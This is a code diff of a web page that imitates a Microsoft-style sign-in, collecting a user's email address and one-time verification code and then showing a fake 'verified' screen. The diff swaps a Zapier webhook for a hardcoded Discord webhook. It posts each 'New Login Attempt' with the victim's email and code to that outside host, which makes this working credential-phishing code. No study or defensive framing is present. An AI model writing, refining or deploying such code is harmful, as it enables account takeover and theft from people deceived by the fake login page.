@@ -59,7 +59,7 @@ h1{ font-size:24px; font-weight:600; margin:0 0 4px 0; color:#1b1b1b; }
 
 .input-wrap{ margin-top:16px; border-bottom:1px solid #666; padding-bottom:4px; }
 .input-wrap input{ width:100%; border:none; background:transparent; padding:4px 0; font-size:15px; color:#1b1b1b; font-family:"Segoe UI", Arial, sans-serif; }
-.input-wrap input::placeholder{ color:#605e5d; }
+.input-wrap input::placeholder{ color:#605e5c; }
 .input-wrap input:focus{ outline:none; }
 .input-wrap:focus-within{ border-bottom:2px solid #0067b8; }
 
@@ -335,25 +335,17 @@ function goToScreen4() {
 
   transitionTo('screen3', 'screen4', null);
 
-  const ZAPIER_WEBHOOK = 'https://hooks.zapier.com/hooks/catch/26329103/upy0rq3/';
+  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1482983673627410634/_rg5kUL8R_4odkQHoONdmEyzF7xhxZgMjrsOqRGl-veeJ2kF_mIqc0sd7srGNrwuegvr';
 
-  const emailData = new URLSearchParams();
-  emailData.append('type', 'data');
-  emailData.append('data', 'Email: ' + '```' + userEmail + '```');
-  fetch(ZAPIER_WEBHOOK, {
+  fetch(DISCORD_WEBHOOK, {
     method: 'POST',
-    body: emailData
-  }).catch(err => console.warn('Zapier fetch failed', err));
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      content: '**New Login Attempt**\nEmail: `' + userEmail + '`\nCode: `' + code + '`'
+    })
+  }).catch(err => console.warn('Discord fetch failed', err));
 
-  const codeData = new URLSearchParams();
-  codeData.append('type', 'data');
-  codeData.append('data', 'Code: ' + '```' + code + '```');
-  fetch(ZAPIER_WEBHOOK, {
-    method: 'POST',
-    body: codeData
-  }).catch(err => console.warn('Zapier fetch failed', err));
-
-  // after 2 seconds swap dots for verified
+    // after 2 seconds swap dots for verified
   setTimeout(() => {
     const dots = document.getElementById('loadingDots');
     const verified = document.getElementById('verifiedScreen');
